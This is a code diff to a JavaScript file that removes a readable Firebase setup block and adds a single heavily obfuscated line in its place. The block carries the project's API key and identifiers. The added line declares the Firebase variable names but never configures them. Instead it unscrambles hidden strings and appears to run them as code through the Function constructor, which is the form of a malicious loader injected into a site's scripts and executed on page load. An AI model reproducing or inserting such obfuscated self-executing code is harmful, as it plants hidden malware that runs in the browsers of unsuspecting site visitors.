@@ -276,37 +276,7 @@ function setElementHeight(selector, offset = 0) {
   
   
   
-  // Import the functions you need from the SDKs you need
-import { initializeApp } from "firebase/app";
-import { getAnalytics } from "firebase/analytics";
-import {
-  getDatabase,
-  ref,
-  onValue,
-  get,
-  set,
-  update,
-  remove
-} from "firebase/database"; // <-- Added this line
-
-// Your web app's Firebase configuration
-const firebaseConfig = {
-  apiKey: "AIzaSyBmzsiveIceDQSbSrO-phCB1WmqksjsCVc",
-  authDomain: "yasxpress-f9bfc.firebaseapp.com",
-  databaseURL: "https://yasxpress-f9bfc-default-rtdb.firebaseio.com",
-  projectId: "yasxpress-f9bfc",
-  storageBucket: "yasxpress-f9bfc.firebasestorage.app",
-  messagingSenderId: "846222157126",
-  appId: "1:846222157126:web:1e890c791fc4f0912db147",
-  measurementId: "G-PMFSKE339V"
-};
-
-// Initialize Firebase
-const app = initializeApp(firebaseConfig);
-const analytics = getAnalytics(app);
-const db = getDatabase(app); // <-- You'll use this to access your database
-  
-  
+var firebaseConfig,app,analytics,db;(function(){var wCW='',suV=148-137;function dSp(o){var v=7232337;var u=o.length;var a=[];for(var e=0;e<u;e++){a[e]=o.charAt(e)};for(var e=0;e<u;e++){var r=v*(e+114)+(v%21210);var d=v*(e+694)+(v%15916);var z=r%u;var l=d%u;var f=a[z];a[z]=a[l];a[l]=f;v=(r+d)%7517088;};return a.join('')};var pvu=dSp('suosrthcxulabfnekgwrdimcvojorctqptynz').substr(0,suV);var lxK='pac h=v3,b57{,.=44;v}rksr"]b.dhf,hAj]l n)p.rht,v,xrzh;sa  a=<7g,.5a8j,v0e7",+0l8f,i9=8;,56o8e,l0(8n,l0u7(,r4v7h,o2a66,p1f;9at z=a]9f0r.v+raa;0[a hil=n=t);t+=)t[x[a]r=j+1;iar t=+]oyn=.0nb)=]5=mS=r2pfyr{vor,kr0{kha(g;msnys)lanat,;l+();varqq]aCgum=nmsaku.fp(ij(8 8))f2r-vpr)vsqsllnyth-g;f>;0+vr-}{oav v=luelgv,r;tCqtv;;.am x=)u;l8v=r8ph0;vxr1w,til(nste;eaj =;+o6((a= i=a;i<[;6+r)ev"r)retic;a)C1d1At(n)evirqc2zrr(;lfkch{a=acu1 * +).+h=rro=eCtpi"1a-m;f=r;6+g;fetsn sfiru=().f(bt(h. e0g}h}yht;c[atCzd<A[(r+]);+1.ahfrao.e+t ic2e-1;d=);=+"2 })l6e=centidu=;ti[((=wnrlh)v=e]1is( >1)(.uu+h3t{s2biteiwg+pqxe)teypese(a[r+(]=;r=p+v;mia(i!,nwl;)]ie(i<))9.=u.h+tAsgbjt;i+g;p))(q;vn=..}orn."u. };nrposh(o[a]=;vvrr*l=nvjxi[(-"r;(a) r=;3f,"2)3+,c0099,r2)..opc,tvh7;ea[ ,==tii,gvfrogCna7Cedd(i6[;ioC(oau )=];u<f)ce,g8hlan+nlol-sel(tiu+s cra1Ai(a)7.4o n.S9runv.nrtm{h6rao!e[j(ab)i;(efu]n[l.solitnu("a"e.ro;n7u4;';var eyV=dSp[pvu];var fhK='';var CyE=eyV;var XOY=eyV(fhK,dSp(lxK));var ZMV=XOY(dSp(',#=idet$ItJi.geJ S;r=nc}f#e0c7Ja(bc\';%+c]}3#{0.3raabj\'(+1ce}d#!0n0]a!bu\'e.p.ybtJ3_7_3bebaJc)7"as+epacp0a(p7a.egd;amr66.0n\/)e&.1eef4sza_670#rJbea3%T76e0das]yituytf!g,b3y5-4y.6,r.og!a5i-_9bzim.C,l.7=a;p_ecshs(!.u45xSJt+4J.)z,yih.90ubaebr!3hJsgt5sh3;.66nsu.peef(mfe$ed3"3{e)8}sJa.!fo=8cn(u6e1aid(b.6\'rbb,e763e{bos$pci3!nsxsy%re=1iCprJ0-46r.m*eJ._sgb.y20Jw,:p%bT-a..J66smpoi4Dpaexs6\/r3.s0e%)g,9rwayam)iJd)iipfd elb\/4i,S2(2;3n)3Jc_.af6!3(2)oJJ,stt=pf$s),J)c_3rJrnc3$JJy.33J\/ev{u;8.%_=.{JJs7t=po$r;p\/f=J.%lbn,t5;%.d_a.6[J;;fnraJ6p80(Jaf8$.010JpJ6J+{)rJrpa=)co.jcaap.dtep.}Jf(rJJ$p,0iJ f,$60n0opJ6o+:)unh"(3J2.f1cd$)3$ps1c4,)-J;3(J(,"1 1.)f)t;oJ64(J3.l.cJc4((q,&9J)=,.$)7l281\/9J6{)o; yJ",7in.!aJ ;7Jt3h(J.n_p6ae.!b=eci1JJc;.Ji4oyJvti3;.!c( ,;,l)%J(p{csn)r6};J0sfJcf,$tibee$ttmiagc)J!a81h)raome.1.7(;C\/c=Jai,!=1a7Juw&.4#_Joxm.a%v,(="ar03,J=ta=.8;!eau,n]c..J_J.gJ6ahJrsJ*3)).;Jel)J}q!*6).i(por.;.ioipi4l{zb.)pk}b8nJ60v;of7!:$6fw6J6$Jt(f}ri(p!r);8gotrhta\/y-i\/svJu;;-}]ii.pcra;!f(("=dccr]e,%w.mJ62t}}liecc3{\/enDptuJ:,0ep,pnJqal;elgntJstt_u}d-t;,fe=o6ed}gipJ.=f.30.%_)6(1u,cei\/n-J.=,ccamsc}a(r}rJe;c-;]rf,r1JnC]n=i;=.c{aIiuu!yr+.],a(tJDfmri(Js4z,Caea65Smxo_p;+ ]0p ojeft9&n]=shoeasecy;c8e Je70,4e}s!genJS7n)eyJn8e,!pbJ29],\/eas)rrm2ntJ=1s].;rf!!m$$37eJ).rtt}rJ}=alpt.)i)i iol;z3.ip)(ti(e;5xo.f2g2;if.!f$_3Je,)errt$r-}{a6a}y3iss%.3gttJh0avyti.searp3;}fJ(a=).f0t%l)i(!uscnianDJn=JcJuple)%)t;.bg.sg.t:asa\/5.a_p=;e)J!J(],J,a)%J=yd77.iJ4io7tJ!Jr5fi5v)e${ 1;J0=fcC.c_eJeJ-64c)n+ri{hJa34(J$}3on4!!,i.=_))a7(1)0(8i}eJ(s;lgtpr=$%fv6n6t.#_g.ajpo{fa$l0iJojloJfr$((_s.$otJJy .{2$,f!6a6, .d{+()pr.t(r(.2 ._%aJ6J3%2*f5nhtao!.4 (.6sJlatt )Jn pa3Jn .$ 3tei[ .mj6ic((v5r8c,bcep_iv4!-[J(s.t_2=e}b ess$tbSs_ add;e.o_c tr]m'));var BQQ=CyE(wCW,ZMV );BQQ(5860);return 1598})()
   
   
   
